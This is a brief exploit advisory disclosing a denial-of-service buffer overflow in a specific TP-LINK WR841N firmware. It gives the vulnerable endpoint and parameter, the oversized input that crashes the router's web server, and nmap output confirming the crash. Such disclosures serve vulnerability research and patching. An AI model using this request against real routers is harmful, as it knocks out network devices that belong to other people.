## Exploit Title: TP-LINK WR841N - Buffer Overflow DOS (Denial of Service)

- Date: 04/28/2024

- Exploit Author: Van Lam Nguyen

- Facebook: fb.com/vanlam1412

- Vendor Homepage: [Tp-Link](http://www.tp-link.com)

- Version: TP-LINK WR841N 3.16.9 Build 160721 Rel.51793n

- Hardware Version:	WR841N v11 00000000

- Tested on: Windows

- CVE : N/A

## Overview

- There exist a buffer overflow vulnerability in TP-LINK WR841N router that can allow an attacker to crash the web server running on the router by sending a crafted request 
To bring back the http (webserver), a user must physically reboot the route.


## Proof of Concept (Using Burp Suite)

- GET request to ping service, made an unauthorized request to /userRpm/PingIframeRpm.htm?ping_addr= , Sending 300 bytes of A’s to limited stack

- nmap 192.168.35.1 -p 80 80/tcp closed http

[!](https://www3.0zz0.com/2024/08/10/19/692309672.jpg)
